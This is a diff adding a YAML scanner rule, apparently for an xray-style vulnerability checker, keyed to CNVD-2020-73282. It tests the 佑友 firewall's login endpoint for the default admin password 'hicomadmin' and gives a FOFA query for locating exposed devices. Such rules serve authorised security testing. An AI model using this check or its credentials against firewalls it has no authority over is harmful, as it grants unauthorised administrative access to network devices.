@@ -1,0 +1,19 @@
+id: CNVD-2020-73282
+
+info:
+    name: 佑友防火墙弱口令
+    author: 你是猪！！！
+    severity: high
+    description: fofa title="佑友防火墙"
+
+rules:
+    r1:
+        request:
+            method: POST
+            path: /index.php?c=user&a=ajax_save
+            headers:
+                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+            body: username=admin&password=hicomadmin&language=zh-cn
+        expression: |
+            response.status == 200 && response.body.bcontains(b'"success":true') && response.body.bcontains(b'"message":') && response.raw_header.bcontains(b'Set-Cookie')  && response.raw_header.bcontains(b'FWSESSID=')
+expression: r1()
